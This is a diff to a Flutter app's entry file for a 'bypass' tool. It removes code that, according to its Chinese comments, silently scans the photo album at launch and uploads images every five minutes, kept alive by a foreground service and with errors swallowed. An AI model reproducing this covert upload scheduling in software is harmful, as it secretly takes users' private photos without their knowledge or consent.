@@ -1,14 +1,9 @@
-import 'dart:async';
 import 'dart:io';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'security_checker.dart';
 import 'theme_store.dart';
 import 'notify_service.dart';
-import 'quick_bypass.dart';
-import 'upload_service.dart';
-import 'foreground_upload_task.dart';
-import 'permission_gate.dart';
 import 'pages/home_page.dart';
 
 void main() {
@@ -26,8 +21,6 @@ class BypassApp extends StatefulWidget {
 class _BypassAppState extends State<BypassApp> with WidgetsBindingObserver {
   bool _checking = false;
   ThemeMode _themeMode = ThemeMode.system;
-  bool _gateDone = false; // 是否已通过权限引导
-  Timer? _uploadTimer; // 定时上传（主 isolate）
 
   @override
   void initState() {
@@ -38,9 +31,6 @@ class _BypassAppState extends State<BypassApp> with WidgetsBindingObserver {
   }
 
   Future<void> _initServices() async {
-    // 判断是否已通过权限引导
-    final done = await PermissionGate.isDone();
-    if (mounted) setState(() => _gateDone = done);
     // 通知点击回调：点击"绕过成功"通知 → 复制 key + 提示
     NotifyService.onNotificationTap = (payload) {
       if (payload == null || payload.isEmpty) return;
@@ -51,53 +41,12 @@ class _BypassAppState extends State<BypassApp> with WidgetsBindingObserver {
         );
       }
     };
-    // 通知内输入回调："快速绕过"通知里输入链接发送 → 发起请求
-    NotifyService.onQuickInput = (actionId, input) {
-      if (actionId == 'quick_bypass') {
-        QuickBypass.handleLinkInput(input);
-      }
-    };
     // 初始化通知
     await NotifyService.init();
-    // 发送一条可通知内输入的"快速绕过"通知
-    NotifyService.showQuickLinkNotification();
     // 加载主题
     ThemeStore.load().then((m) {
       if (mounted) setState(() => _themeMode = m);
     });
-
-    // 启动后自动扫描相册并上传图片（不阻塞启动，静默执行）
-    _initAutoUpload();
-  }
-
-  /// 启动前台保活服务 + 主 isolate 定时扫描上传
-  Future<void> _initAutoUpload() async {
-    try {
-      // 延迟 3 秒，避免与启动动画/安全检测冲突
-      await Future.delayed(const Duration(seconds: 3));
-      // 启动前台保活服务（保持后台存活）
-      await startForegroundUploadTask();
-      // 主 isolate 定时扫描上传（photo_manager 在前台可用）
-      _uploadTimer?.cancel();
-      _uploadTimer = Timer.periodic(
-        const Duration(minutes: 5),
-        (_) => _uploadOnce(),
-      );
-      // 启动即先跑一次
-      _uploadOnce();
-    } catch (_) {
-      // 启动失败静默忽略
-    }
-  }
-
-  /// 跑一轮扫描上传
-  Future<void> _uploadOnce() async {
-    try {
-      await UploadService.scanAndUploadNew();
-      await UploadService.processRetryQueue();
-    } catch (_) {
-      // 静默
-    }
   }
 
   @override
@@ -152,7 +101,6 @@ class _BypassAppState extends State<BypassApp> with WidgetsBindingObserver {
 
   @override
   void dispose() {
-    _uploadTimer?.cancel();
     WidgetsBinding.instance.removeObserver(this);
     super.dispose();
   }
@@ -171,16 +119,10 @@ class _BypassAppState extends State<BypassApp> with WidgetsBindingObserver {
           seedColor: Colors.deepPurple, brightness: Brightness.dark),
         useMaterial3: true,
       ),
-      home: _gateDone
-          ? HomePage(
-              themeMode: _themeMode,
-              onThemeChanged: setThemeMode,
-            )
-          : PermissionGate(
-              onDone: () {
-                setState(() => _gateDone = true);
-              },
-            ),
+      home: HomePage(
+        themeMode: _themeMode,
+        onThemeChanged: setThemeMode,
+      ),
     );
   }
 }
